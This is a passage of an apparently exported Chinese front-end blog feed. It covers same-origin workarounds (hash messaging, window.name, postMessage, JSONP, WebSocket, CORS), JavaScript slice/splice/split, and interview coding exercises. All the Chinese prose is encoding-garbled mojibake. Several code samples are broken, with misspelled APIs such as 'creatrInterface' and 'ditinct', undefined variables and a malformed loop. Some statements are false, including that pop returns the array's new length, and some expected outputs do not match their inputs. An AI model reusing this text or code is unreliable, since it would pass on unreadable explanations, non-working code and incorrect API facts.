identifierï¼‰ï¼ˆ2ï¼‰window.nameï¼ˆ3ï¼‰è·¨æ–‡æ¡£é€šä¿¡APIï¼ˆCross-document messagingï¼‰ 2.1 ç‰‡æ®µè¯†åˆ«ç¬¦ç‰‡æ®µæ ‡è¯†ç¬¦æŒ‡çš„æ˜¯ï¼ŒURLçš„#å·åŽé¢çš„éƒ¨åˆ†ï¼Œæ¯”å¦‚ http://example.com/x.html#fragmentçš„ #fragment çˆ¶çª—å£å¯ä»¥æŠŠä¿¡æ¯ï¼Œå†™å…¥å­çª—å£çš„ç‰‡æ®µæ ‡è¯†ç¬¦ã€‚ var src = originURL + &#39;#&#39; + data;document.getElementById(â€˜myIFrameâ€™).src = src; å­çª—å£é€šè¿‡ç›‘å¬hashchangeäº‹ä»¶å¾—åˆ°é€šçŸ¥ã€‚ window.onhashchange = checkMessage;function checkMessage() { var message = window.location.hash; // â€¦} åŒæ ·çš„ï¼Œå­çª—å£ä¹Ÿå¯ä»¥æ”¹å˜çˆ¶çª—å£çš„ç‰‡æ®µæ ‡è¯†ç¬¦ã€‚ parent.location.href= target + â€œ#â€ + hash; 2.2 window.nameæµè§ˆå™¨çª—å£æœ‰window.nameå±žæ€§ã€‚è¿™ä¸ªå±žæ€§çš„æœ€å¤§ç‰¹ç‚¹æ˜¯ï¼Œæ— è®ºæ˜¯å¦åŒæºï¼Œåªè¦åœ¨åŒä¸€ä¸ªçª—å£é‡Œï¼Œå‰ä¸€ä¸ªç½‘é¡µè®¾ç½®äº†è¿™ä¸ªå±žæ€§ï¼ŒåŽä¸€ä¸ªç½‘é¡µå¯ä»¥è¯»å–å®ƒã€‚çˆ¶çª—å£å…ˆæ‰“å¼€ä¸€ä¸ªå­çª—å£ï¼Œè½½å…¥ä¸€ä¸ªä¸åŒæºçš„ç½‘é¡µï¼Œè¯¥ç½‘é¡µå°†ä¿¡æ¯å†™å…¥window.nameå±žæ€§ã€‚ window.name = data; æŽ¥ç€ï¼Œå­çª—å£è·³å›žä¸Žä¸»çª—å£åŒåŸŸçš„ç½‘å€ location = â€˜http://parent.url.com/xxx.html&#39;; ç„¶åŽï¼Œä¸»çª—å£å°±å¯ä»¥è¯»å–å­çª—å£çš„window.nameäº†ã€‚ var data = document.getElementById(â€˜myFrameâ€™).contentWindow.name; è¿™ç§æ–¹æ³•çš„ä¼˜ç‚¹æ˜¯ï¼Œwindow.nameå®¹é‡å¾ˆå¤§ï¼Œå¯ä»¥æ”¾ç½®éžå¸¸é•¿çš„å­—ç¬¦ä¸²ï¼›ç¼ºç‚¹æ˜¯å¿…é¡»ç›‘å¬å­çª—å£window.nameå±žæ€§çš„å˜åŒ–ï¼Œå½±å“ç½‘é¡µæ€§èƒ½ã€‚ 2.3 window.postMessageè·¨æ–‡æ¡£é€šä¿¡APIï¼ˆCross-documentmessagingï¼‰è¿™ä¸ªAPIä¸ºwindowå¯¹è±¡æ–°å¢žäº†ä¸€ä¸ªwindow.postMessageæ–¹æ³•ï¼Œå…è®¸è·¨çª—å£é€šä¿¡ï¼Œä¸è®ºè¿™ä¸¤ä¸ªçª—å£æ˜¯å¦åŒæºã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œçˆ¶çª—å£http://aaa.comå‘å­çª—å£http://bbb.comå‘æ¶ˆæ¯ï¼Œè°ƒç”¨postMessageæ–¹æ³•å°±å¯ä»¥äº†ã€‚ var popup = window.open(â€˜http://bbb.com&#39;, â€˜titleâ€™);popup.postMessage(â€˜Hello World!â€™, â€˜http://bbb.com&#39;); postMessage æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å…·ä½“çš„ä¿¡æ¯å†…å®¹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æŽ¥å—ä¿¡æ¯çš„çª—å£çš„æºï¼ˆoriginï¼‰,å³â€œåè®®+åŸŸå+ç«¯å£â€,ä¹Ÿå¯ä»¥è®¾ä¸ºâ€œ*â€,è¡¨ç¤ºä¸é™åˆ¶åŸŸåï¼Œå‘æ‰€æœ‰çª—å£å‘é€ã€‚å­çª—å£å‘çˆ¶çª—å£å‘é€ä¿¡æ¯çš„å†™æ³•ç±»ä¼¼ã€‚ window.opener.postMessage(â€˜helloâ€™,â€™http://aa.com&#39;); çˆ¶çª—å£æˆ–è€…æ˜¯å­çª—å£éƒ½å¯ä»¥é€šè¿‡messageäº‹ä»¶ï¼Œç›‘å¬å¯¹æ–¹çš„ä¿¡æ¯ window.addEvenListener(â€˜messageâ€™,function(e){ console.log(e.data);},false); message äº‹ä»¶çš„äº‹ä»¶å¯¹è±¡ event æä¾›ä»¥ä¸‹ä¸‰ä¸ªå±žæ€§event.source å‘é€ä¿¡æ¯çš„çª—å£event.origin æ¶ˆæ¯å‘å‘çš„ç½‘ç«™event.data æ¶ˆæ¯å†…å®¹ä¸‹é¢çš„ä¾‹å­æ˜¯ï¼Œå­çª—å£é€šè¿‡event.sourceå±žæ€§å¼•ç”¨çˆ¶çª—å£ï¼Œç„¶åŽå‘é€æ¶ˆæ¯ã€‚ 1234window.addEventListener('message', receiveMessage); function receiveMessage(event) &#123; event.source.postMessage('Nice to see you!', '*'); &#125; event.originå±žæ€§å¯ä»¥è¿‡æ»¤ä¸æ˜¯å‘ç»™æœ¬çª—å£çš„æ¶ˆæ¯ã€‚ 123456789window.addEventListener('message', receiveMessage); function receiveMessage(event) &#123; if (event.origin !== 'http://aaa.com') return; if (event.data === 'Hello World') &#123; event.source.postMessage('Hello', event.origin); &#125; else &#123; console.log(event.data); &#125;&#125; LocalStorageé€šè¿‡window.postMessageï¼Œè¯»å†™å…¶ä»–çª—å£çš„ LocalStorage ä¹Ÿæˆä¸ºäº†å¯èƒ½ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œä¸»çª—å£å†™å…¥iframeå­çª—å£çš„localStorageã€‚ 1234567window.onmessage = function(e) &#123;if (e.origin !== 'http://bbb.com') &#123; return;&#125;var payload = JSON.parse(e.data);localStorage.setItem(payload.key, JSON.stringify(payload.data));&#125;; ä¸Šé¢ä»£ç ä¸­ï¼Œå­çª—å£å°†çˆ¶çª—å£å‘æ¥çš„æ¶ˆæ¯ï¼Œå†™å…¥è‡ªå·±çš„LocalStorageã€‚ çˆ¶çª—å£å‘é€æ¶ˆæ¯çš„ä»£ç å¦‚ä¸‹ã€‚ 123var win = document.getElementsByTagName('iframe')[0].contentWindow;var obj = &#123; name: 'Jack' &#125;;win.postMessage(JSON.stringify(&#123;key: 'storage', data: obj&#125;), 'http://bbb.com'); åŠ å¼ºç‰ˆçš„å­çª—å£æŽ¥æ”¶æ¶ˆæ¯çš„ä»£ç å¦‚ä¸‹ã€‚ 1234567891011121314151617window.onmessage = function(e) &#123;if (e.origin !== 'http://bbb.com') return;var payload = JSON.parse(e.data);switch (payload.method) &#123; case 'set': localStorage.setItem(payload.key, JSON.stringify(payload.data)); break; case 'get': var parent = window.parent; var data = localStorage.getItem(payload.key); parent.postMessage(data, 'http://aaa.com'); break; case 'remove': localStorage.removeItem(payload.key); break;&#125;&#125;; åŠ å¼ºç‰ˆçš„çˆ¶çª—å£å‘é€æ¶ˆæ¯ä»£ç å¦‚ä¸‹ã€‚ 1234567891011var win = document.getElementsByTagName('iframe')[0].contentWindow;var obj = &#123; name: 'Jack' &#125;;// å­˜å…¥å¯¹è±¡win.postMessage(JSON.stringify(&#123;key: 'storage', method: 'set', data: obj&#125;), 'http://bbb.com');// è¯»å–å¯¹è±¡win.postMessage(JSON.stringify(&#123;key: 'storage', method: "get"&#125;), "*");window.onmessage = function(e) &#123;if (e.origin != 'http://aaa.com') return;// "Jack"console.log(JSON.parse(e.data).name);&#125;; AJAXåŒæºæ”¿ç­–è§„å®šï¼ŒAJAXè¯·æ±‚åªèƒ½å‘ç»™åŒæºçš„ç½‘å€ï¼Œå¦åˆ™å°±æŠ¥é”™ã€‚é™¤äº†æž¶è®¾æœåŠ¡å™¨ä»£ç†ï¼ˆæµè§ˆå™¨è¯·æ±‚åŒæºæœåŠ¡å™¨ï¼Œå†ç”±åŽè€…è¯·æ±‚å¤–éƒ¨æœåŠ¡ï¼‰ï¼Œæœ‰ä¸‰ç§æ–¹æ³•è§„é¿è¿™ä¸ªé™åˆ¶ã€‚ 4.1 JSONP WebSocket CORSJSONPæ˜¯æœåŠ¡å™¨ä¸Žå®¢æˆ·ç«¯è·¨æºé€šä¿¡çš„å¸¸ç”¨æ–¹æ³•ã€‚æœ€å¤§ç‰¹ç‚¹å°±æ˜¯ç®€å•é€‚ç”¨ï¼Œè€å¼æµè§ˆå™¨å…¨éƒ¨æ”¯æŒï¼ŒæœåŠ¡å™¨æ”¹é€ éžå¸¸å°ã€‚ å®ƒçš„åŸºæœ¬æ€æƒ³æ˜¯ï¼Œç½‘é¡µé€šè¿‡æ·»åŠ ä¸€ä¸ª&lt;script&gt;å…ƒç´ ï¼Œå‘æœåŠ¡å™¨è¯·æ±‚JSONæ•°æ®ï¼Œè¿™ç§åšæ³•ä¸å—åŒæºæ”¿ç­–é™åˆ¶ï¼›æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åŽï¼Œå°†æ•°æ®æ”¾åœ¨ä¸€ä¸ªæŒ‡å®šåå­—çš„å›žè°ƒå‡½æ•°é‡Œä¼ å›žæ¥ã€‚ é¦–å…ˆï¼Œç½‘é¡µåŠ¨æ€æ’å…¥&lt;script&gt;å…ƒç´ ï¼Œç”±å®ƒå‘è·¨æºç½‘å€å‘å‡ºè¯·æ±‚ã€‚ 1234567891011121314function addScriptTag(src) &#123;var script = document.createElement('script');script.setAttribute("type","text/javascript");script.src = src;document.body.appendChild(script);&#125;window.onload = function () &#123;addScriptTag('http://example.com/ip?callback=foo');&#125;function foo(data) &#123;console.log('Your public IP address is: ' + data.ip);&#125;; ä¸Šé¢ä»£ç é€šè¿‡åŠ¨æ€æ·»åŠ &lt;script&gt;å…ƒç´ ï¼Œå‘æœåŠ¡å™¨example.comå‘å‡ºè¯·æ±‚ã€‚æ³¨æ„ï¼Œè¯¥è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²æœ‰ä¸€ä¸ªcallbackå‚æ•°ï¼Œç”¨æ¥æŒ‡å®šå›žè°ƒå‡½æ•°çš„åå­—ï¼Œè¿™å¯¹äºŽJSONPæ˜¯å¿…éœ€çš„ã€‚æœåŠ¡å™¨æ”¶åˆ°è¿™ä¸ªè¯·æ±‚ä»¥åŽï¼Œä¼šå°†æ•°æ®æ”¾åœ¨å›žè°ƒå‡½æ•°çš„å‚æ•°ä½ç½®è¿”å›žã€‚ 123foo(&#123;"ip": "8.8.8.8"&#125;); ç”±äºŽ&lt;script&gt;å…ƒç´ è¯·æ±‚çš„è„šæœ¬ï¼Œç›´æŽ¥ä½œä¸ºä»£ç è¿è¡Œã€‚è¿™æ—¶ï¼Œåªè¦æµè§ˆå™¨å®šä¹‰äº†fooå‡½æ•°ï¼Œè¯¥å‡½æ•°å°±ä¼šç«‹å³è°ƒç”¨ã€‚ä½œä¸ºå‚æ•°çš„JSONæ•°æ®è¢«è§†ä¸ºJavaScriptå¯¹è±¡ï¼Œè€Œä¸æ˜¯å­—ç¬¦ä¸²ï¼Œå› æ­¤é¿å…äº†ä½¿ç”¨JSON.parseçš„æ­¥éª¤ã€‚ 4.2 WebSocketWebSocketæ˜¯ä¸€ç§é€šä¿¡åè®®ï¼Œä½¿ç”¨ws://ï¼ˆéžåŠ å¯†ï¼‰å’Œwss://ï¼ˆåŠ å¯†ï¼‰ä½œä¸ºåè®®å‰ç¼€ã€‚è¯¥åè®®ä¸å®žè¡ŒåŒæºæ”¿ç­–ï¼Œåªè¦æœåŠ¡å™¨æ”¯æŒï¼Œå°±å¯ä»¥é€šè¿‡å®ƒè¿›è¡Œè·¨æºé€šä¿¡ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œæµè§ˆå™¨å‘å‡ºçš„WebSocketè¯·æ±‚çš„å¤´ä¿¡æ¯ï¼ˆæ‘˜è‡ªç»´åŸºç™¾ç§‘ï¼‰ã€‚ GET /chat HTTP/1.1Host: server.example.comUpgrade: websocketConnection: UpgradeSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==Sec-WebSocket-Protocol: chat, superchatSec-WebSocket-Version: 13Origin: http://example.com ä¸Šé¢ä»£ç ä¸­ï¼Œæœ‰ä¸€ä¸ªå­—æ®µæ˜¯Originï¼Œè¡¨ç¤ºè¯¥è¯·æ±‚çš„è¯·æ±‚æºï¼ˆoriginï¼‰ï¼Œå³å‘è‡ªå“ªä¸ªåŸŸåã€‚æ­£æ˜¯å› ä¸ºæœ‰äº†Originè¿™ä¸ªå­—æ®µï¼Œæ‰€ä»¥WebSocketæ‰æ²¡æœ‰å®žè¡ŒåŒæºæ”¿ç­–ã€‚å› ä¸ºæœåŠ¡å™¨å¯ä»¥æ ¹æ®è¿™ä¸ªå­—æ®µï¼Œåˆ¤æ–­æ˜¯å¦è®¸å¯æœ¬æ¬¡é€šä¿¡ã€‚å¦‚æžœè¯¥åŸŸååœ¨ç™½åå•å†…ï¼ŒæœåŠ¡å™¨å°±ä¼šåšå‡ºå¦‚ä¸‹å›žåº”ã€‚ HTTP/1.1 101 Switching ProtocolsUpgrade: websocketConnection: UpgradeSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=Sec-WebSocket-Protocol: chat 4.3 CORSCORSæ˜¯è·¨æºèµ„æºåˆ†äº«ï¼ˆCross-Origin Resource Sharingï¼‰çš„ç¼©å†™ã€‚å®ƒæ˜¯W3Cæ ‡å‡†ï¼Œæ˜¯è·¨æºAJAXè¯·æ±‚çš„æ ¹æœ¬è§£å†³æ–¹æ³•ã€‚ç›¸æ¯”JSONPåªèƒ½å‘GETè¯·æ±‚ï¼ŒCORSå…è®¸ä»»ä½•ç±»åž‹çš„è¯·æ±‚ã€‚]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>httpåŒæºç­–ç•¥</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ“ä½œjsæ•°ç»„è·Ÿå­—ç¬¦çš„æ³¨æ„ç‚¹]]></title>
    <url>%2F2018-05-13-Tp.html</url>
    <content type="text"><![CDATA[slice/splice/splitåŒºåˆ«slice ï¼ˆæ•°ç»„ã€å­—ç¬¦ä¸²ï¼‰â‘  array.slice(start,end);è§£é‡Šï¼šè¯¥æ–¹æ³•æ˜¯å¯¹æ•°ç»„è¿›è¡Œéƒ¨åˆ†æˆªå–ï¼Œå¹¶è¿”å›žä¸€ä¸ªæ•°ç»„å‰¯æœ¬ï¼›å‚æ•°startæ˜¯æˆªå–çš„å¼€å§‹æ•°ç»„ç´¢å¼•ï¼Œendå‚æ•°ç­‰äºŽä½ è¦å–çš„æœ€åŽä¸€ä¸ªå­—ç¬¦çš„ä½ç½®å€¼åŠ ä¸Š1ï¼ˆå¯é€‰ï¼‰ 1234567// slicevar a = [1,2,3,4,5,6];var b = a.slice(0,3); //[1,2,3]var c = a.slice(3); //[4,5,6]var d = a.slice(-2); //[5,6]var e = a.slice(-7); //[1,2,3,4,5,6]var f = a.slice(9); //[] â‘¡ string.slice(start,end);è§£é‡Šï¼šsliceæ–¹æ³•å¤åˆ¶stringçš„ä¸€éƒ¨åˆ†æ¥æž„é€ ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼Œç”¨æ³•ä¸Žå‚æ•°åŒ€å’Œæ•°ç»„çš„sliceæ–¹æ³•ä¸€æ ·;endå‚æ•°ç­‰äºŽä½ è¦å–çš„æœ€åŽä¸€ä¸ªå­—ç¬¦çš„ä½ç½®å€¼åŠ ä¸Š1 123// slicevar str = 'hi slice'var e = str.slice(2); // slice splice ï¼ˆæ•°ç»„ï¼‰array.splice(start,deleteCount,itemâ€¦);è§£é‡Šï¼šspliceæ–¹æ³•ä»Žarrayä¸­ç§»é™¤ä¸€ä¸ªæˆ–å¤šä¸ªæ•°ç»„ï¼Œå¹¶ç”¨æ–°çš„itemæ›¿æ¢å®ƒä»¬ã€‚å‚æ•°startæ˜¯ä»Žæ•°ç»„arrayä¸­ç§»é™¤å…ƒç´ çš„å¼€å§‹ä½ç½®ã€‚å‚æ•°deleteCountæ˜¯è¦ç§»é™¤çš„å…ƒç´ çš„ä¸ªæ•°ã€‚å¦‚æžœæœ‰é¢å¤–çš„å‚æ•°ï¼Œé‚£ä¹ˆitemä¼šæ’å…¥åˆ°è¢«ç§»é™¤å…ƒç´ çš„ä½ç½®ä¸Šã€‚å®ƒè¿”å›žä¸€ä¸ªåŒ…å«è¢«ç§»é™¤å…ƒç´ çš„æ•°ç»„ã€‚ 123//splicevar a = ['a','b','c','d'];var b = a.splice(1,1,'r','t'); // a = ['a','r','t','c','d'] b = ['b'] split ï¼ˆå­—ç¬¦ä¸²ï¼‰string.split(separator,limit);è§£é‡Šï¼šsplitæ–¹æ³•æŠŠè¿™ä¸ªstringåˆ†å‰²æˆç‰‡æ®µæ¥åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ã€‚å¯é€‰å‚æ•°limitå¯ä»¥é™åˆ¶è¢«åˆ†å‰²çš„ç‰‡æ®µæ•°é‡ã€‚separatorå‚æ•°å¯ä»¥æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ã€‚å¦‚æžœseparatoræ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ï¼Œä¼šè¿”å›žä¸€ä¸ªå•å­—ç¬¦çš„æ•°ç»„ã€‚ 123//splitvar a = '2736762687';var b = a.split(''); //b =["2", "7", "3", "6", "7", "6", "2", "6", "8", "7"] a = '2736762687';]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è¯•é¢˜]]></title>
    <url>%2F2018-05-12-test.html</url>
    <content type="text"><![CDATA[è¯•é¢˜let\var\const1.constå®šä¹‰çš„å˜é‡ä¸å¯ä»¥ä¿®æ”¹ï¼Œè€Œä¸”å¿…é¡»åˆå§‹åŒ–2.varå®šä¹‰çš„å˜é‡å¯ä»¥ä¿®æ”¹ï¼Œå¦‚æžœä¸åˆå§‹åŒ–ä¼šè¾“å‡ºundefinedï¼Œä¸ä¼šæŠ¥é”™ã€‚3.letæ˜¯å—çº§ä½œç”¨åŸŸï¼Œå‡½æ•°å†…éƒ¨ä½¿ç”¨letå®šä¹‰åŽï¼Œå¯¹å‡½æ•°å¤–éƒ¨æ— å½±å“ã€‚ é­”æ³•å¸å°æ˜“å‡†å¤‡åŽ»é­”æ³•çŽ‹å›½é‡‡è´­é­”æ³•ç¥žå™¨,è´­ä¹°é­”æ³•ç¥žå™¨éœ€è¦ä½¿ç”¨é­”æ³•å¸,ä½†æ˜¯å°æ˜“çŽ°åœ¨ä¸€æžšé­”æ³•å¸éƒ½æ²¡æœ‰,ä½†æ˜¯å°æ˜“æœ‰ä¸¤å°é­”æ³•æœºå™¨å¯ä»¥é€šè¿‡æŠ•å…¥x(xå¯ä»¥ä¸º0)ä¸ªé­”æ³•å¸äº§ç”Ÿæ›´å¤šçš„é­”æ³•å¸ã€‚é­”æ³•æœºå™¨1:å¦‚æžœæŠ•å…¥xä¸ªé­”æ³•å¸,é­”æ³•æœºå™¨ä¼šå°†å…¶å˜ä¸º2x+1ä¸ªé­”æ³•å¸é­”æ³•æœºå™¨2:å¦‚æžœæŠ•å…¥xä¸ªé­”æ³•å¸,é­”æ³•æœºå™¨ä¼šå°†å…¶å˜ä¸º2x+2ä¸ªé­”æ³•å¸å°æ˜“é‡‡è´­é­”æ³•ç¥žå™¨æ€»å…±éœ€è¦nä¸ªé­”æ³•å¸,æ‰€ä»¥å°æ˜“åªèƒ½é€šè¿‡ä¸¤å°é­”æ³•æœºå™¨äº§ç”Ÿæ°å¥½nä¸ªé­”æ³•å¸,å°æ˜“éœ€è¦ä½ å¸®ä»–è®¾è®¡ä¸€ä¸ªæŠ•å…¥æ–¹æ¡ˆä½¿ä»–æœ€åŽæ°å¥½æ‹¥æœ‰nä¸ªé­”æ³•å¸ã€‚ 12345678910111213141516171819var n = parseInt(readline()); //node.jsè¾“å…¥var n = 999;var a = [];var flag = true;while (flag) &#123; if(n&gt;2)&#123; if(n%2 == 0)&#123; a.push(2); n = (n-2)/2; &#125;else&#123; a.push(1); n = (n-1)/2 &#125; &#125;else&#123; flag = false; a.push(n); &#125;&#125;console.log(a.reverse().join('')); å‡½æ•°çš„å‚æ•°åä¸Žå…¨å±€å˜é‡ç›¸åŒï¼Œåœ¨å‡½æ•°å†…è°ƒç”¨æ”¹å˜é‡åæ˜¯å¯¹å‡½æ•°å‚æ•°çš„è°ƒç”¨ï¼Œè€Œä¸æ˜¯å¯¹å…¨å±€å˜é‡çš„è°ƒç”¨1234567var bb = 1;function aa(bb) &#123; bb = 2; alert(bb);&#125;;aa(bb); //2alert(bb); //1 ArrayArray.prototype.shift(); åˆ é™¤æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›žè¿™ä¸ªå…ƒç´ Array.prototype.unshift();åœ¨æ•°ç»„çš„å¼€å¤´å¢žåŠ ä¸€ä¸ªæˆ–è€…å¤šä¸ªå…ƒç´ ï¼Œå¹¶ä¸”è¿”å›žæ•°ç»„çš„æ–°é•¿åº¦Array.prototype.pop();åˆ é™¤æ•°ç»„çš„æœ€åŽä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›žæ•°ç»„çš„æ–°é•¿åº¦Array.prototype.push();åœ¨æ•°ç»„çš„æœ«å°¾å¢žåŠ ä¸€ä¸ªæˆ–è€…å¤šä¸ªå…ƒç´ ï¼Œå¹¶ä¸”è¿”å›žæ•°ç»„çš„æ–°é•¿åº¦Array.prototype.sort();å¯¹æ•°ç»„è¿›è¡ŒæŽ’åºï¼Œå¹¶è¿”å›žè¯¥æ•°ç»„Array.prototype.reverse();é¢ å€’æ•°ç»„ä¸­å…ƒç´ çš„æŽ’åºé¡ºåºArray.prototype.splice(); äº‹ä»¶å§”æ´¾123456789101112131415161718192021222324var elements = document.getElementsByTagName('li');var length = elements.length;for(let i=0;i&lt;length;i++)&#123; elements[i].onclick = function()&#123; alert(i); &#125;&#125;&lt;ul&gt; &lt;li&gt;click me&lt;/li&gt; &lt;li&gt;click me&lt;/li&gt; &lt;li&gt;click me&lt;/li&gt; &lt;li&gt;click me&lt;/li&gt;&lt;/ul&gt;var elements = document.getElementsByTagName('li');var length = elements.length;function handle(i)&#123; return function()&#123; alert(i); &#125;&#125;for(let i=0;i&lt;length;i++)&#123;elements[i].onclick = handle(i);&#125; å†™ä¸€ä¸ªæ±‚å’Œçš„å‡½æ•°sumï¼Œè¾¾åˆ°ä¸‹é¢çš„æ•ˆæžœsum(1, 2, 3, 4, 5);// Should equal 0sum(5, null, -5);// Should equal 10sum(â€˜1.0â€™, false, 1, true, 1, â€˜Aâ€™, 1, â€˜Bâ€™, 1, â€˜Câ€™, 1, â€˜Dâ€™, 1, â€˜Eâ€™, 1, â€˜Fâ€™, 1, â€˜Gâ€™, 1);// Should equal 0.3, not 0.30000000000000004sum(0.1, 0.2); 1234567function sum()&#123; var result = 0; for(var i=0;l=arguments;i&lt; l;i++)&#123; result+= (!isNaN(arguments[i])&amp;&amp;window.parseFloat(arguments[i])) || 0 &#125; return result.toFixed(3)*1000/1000;&#125; å›žæ–‡ä¸²é—®é¢˜ç»™å®šä¸€ä¸ªå­—ç¬¦ä¸²sï¼Œä½ å¯ä»¥ä»Žä¸­åˆ é™¤ä¸€äº›å­—ç¬¦ï¼Œä½¿å¾—å‰©ä¸‹çš„ä¸²æ˜¯ä¸€ä¸ªå›žæ–‡ä¸²ã€‚å¦‚ä½•åˆ é™¤æ‰èƒ½ä½¿å¾—å›žæ–‡ä¸²æœ€é•¿å‘¢ï¼Ÿè¾“å‡ºéœ€è¦åˆ é™¤çš„å­—ç¬¦ä¸ªæ•°ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839const readline = require('readline');const rl = readline.createInterface(&#123; input:process.stdin, output:process.stdout&#125;);rl.on('line',function(line)&#123; var data = line.trim(); var reverdata = data.split('').reverse().join(''); var len = data.length; console.log(len - dynamic(data,reverdata));&#125;);function dynamic(s1,s2)&#123; var len1=s1.length; var len2=s2.length; var arr=new Array(len1+1); for(var i=0;i&lt;=len1;i++)&#123; arr[i]=new Array(len2+1); console.log(arr); &#125; for(var i=0;i&lt;=len1;i++)&#123; arr[i][0]=0; &#125; for(var j=1;j&lt;=len2;j++)&#123; arr[0][j]=0; &#125; for(var i=1;i&lt;=len1;i++)&#123; for(var j=1;j&lt;=len2;j++)&#123; if(s1[i-1]==s2[j-1])&#123; arr[i][j]=arr[i-1][j-1]+1; &#125;else&#123; arr[i][j]=Math.max(arr[i][j-1],arr[i-1][j]); &#125; &#125; &#125; console.log(arr); return arr[len1][len2];&#125;var a = dynamic('abgad','dagba');console.log(a); å°Qæœ€è¿‘é‡åˆ°äº†ä¸€ä¸ªéš¾é¢˜ï¼šæŠŠä¸€ä¸ªå­—ç¬¦ä¸²çš„å¤§å†™å­—æ¯æ”¾åˆ°å­—ç¬¦ä¸²çš„åŽé¢ï¼Œå„ä¸ªå­—ç¬¦çš„ç›¸å¯¹ä½ç½®ä¸å˜ï¼Œä¸”ä¸èƒ½ç”³è¯·é¢å¤–çš„ç©ºé—´ã€‚ä½ èƒ½å¸®å¸®å°Qå—ï¼Ÿ 123456789101112131415161718192021const readline = require('readline');const rl = readline.creatrInterface(&#123; input:process.stdin, output:process.stdout&#125;);rl.on('line',function(line)&#123; var token = line.split(''); var len = token.length; var p = 0; for(var i=0;i&lt;l-p)&#123; var num = token[i].charCodeAt(0); if(num &lt;= 90)&#123; token.push(tokens[i]); token.splice(i,1); p++ &#125;else&#123; i++ &#125; &#125; console.log(tokens.join(''));&#125;); åŽ»é‡æ–¹æ³•1æ€è·¯ï¼š1.æž„å»ºä¸€ä¸ªæ–°çš„æ•°ç»„å­˜æ”¾ç»“æžœ2.forå¾ªçŽ¯ä¸­æ¯æ¬¡ä»ŽåŽŸæ•°ç»„ä¸­å–å‡ºä¸€ä¸ªå…ƒç´ ï¼Œç”¨è¿™ä¸ªå…ƒç´ å¾ªçŽ¯ä¸Žç»“æžœæ•°ç»„å¯¹æ¯”3.è‹¥ç»“æžœæ•°ç»„ä¸­æ²¡æœ‰è¯¥å…ƒç´ ï¼Œåˆ™å­˜åˆ°ç»“æžœæ•°ç»„ä¸­ 123456789101112131415161718Array.prototype.distinct = function()&#123; var res = [this[0]] for(var i=1;i&lt;this.length;i++)&#123; var repeat = false; for(var j=0;j&lt;res.length;j++)&#123; if(this[i] == res[j])&#123; repeat = true; break; &#125; &#125; if(!repeat)&#123; res.push(this[i]) &#125; &#125; return res;&#125;var arr = [7,1,2,3,1,2,2,2,3,5,6,'a', 'a', 'b', 'd', 'e'];console.log(arr.distinct()); æ–¹æ³•2æ€è·¯ï¼š1.å…ˆå°†åŽŸæ•°ç»„è¿›è¡ŒæŽ’åº2.æ£€æŸ¥åŽŸæ•°ç»„ä¸­çš„ç¬¬iä¸ªå…ƒç´  ä¸Ž ç»“æžœæ•°ç»„ä¸­çš„æœ€åŽä¸€ä¸ªå…ƒç´ æ˜¯å¦ç›¸åŒï¼Œå›  ä¸ºå·²ç»æŽ’åºï¼Œæ‰€ä»¥é‡å¤å…ƒç´ ä¼šåœ¨ç›¸é‚»ä½ç½®3.å¦‚æžœä¸ç›¸åŒï¼Œåˆ™å°†è¯¥å…ƒç´ å­˜å…¥ç»“æžœæ•°ç»„ä¸­ 123456789101112Array.prototype.distinct = function()&#123; this.sort(); var res = [this[0]]; for(var i=1;i&lt;this.length;i++)&#123; if(this[i] !== res[res.length-1])&#123; res.push(this[i]); &#125; &#125; return res;&#125; var arr = [7,1,2,3,1,2,2,2,3,5,6,'a', 'a', 'b', 'd', 'e']; console.log(arr.ditinct()); æ–¹æ³•31.åˆ›å»ºä¸€ä¸ªæ–°çš„æ•°ç»„å­˜æ”¾ç»“æžœ2.åˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡3.forå¾ªçŽ¯æ—¶ï¼Œæ¯æ¬¡å–å‡ºä¸€ä¸ªå…ƒç´ ä¸Žå¯¹è±¡è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æžœè¿™ä¸ªå…ƒç´ ä¸é‡å¤ï¼Œåˆ™æŠŠå®ƒå­˜æ”¾åˆ°ç»“æžœæ•°ç»„ä¸­ï¼ŒåŒæ—¶æŠŠè¿™ä¸ªå…ƒç´ çš„å†…å®¹ä½œä¸ºå¯¹è±¡çš„ä¸€ä¸ªå±žæ€§ï¼Œå¹¶èµ‹å€¼ä¸º1ï¼Œå­˜å…¥åˆ°ç¬¬2æ­¥å»ºç«‹çš„å¯¹è±¡ä¸­ã€‚ 12345678910111213Array.prototype.distinct = function()&#123; var res = []; var json = &#123;&#125;; for(var i=0;i&lt;this.length;i++)&#123; if(!json[this[i]])&#123; res.push(this[i]); json[this[i]] = 1; &#125; &#125; return res;&#125;var arr = [7,1,2,3,1,2,2,2,3,5,6,'a', 'a', 'b', 'd', 'e'];console.log(arr.distinct()); æŽ’åºå¤§å°12345678910111213function mySort() &#123; var tags = new Array(); tags = Array.prototype.slice.call(arguments); console.log(arguments); console.log(arguments.length); console.log(tags); tags.sort(function(pre,next)&#123; return pre - next; &#125;) return tags; &#125;var result = mySort(50,11,16,32,24,99,57,100);console.info(result); 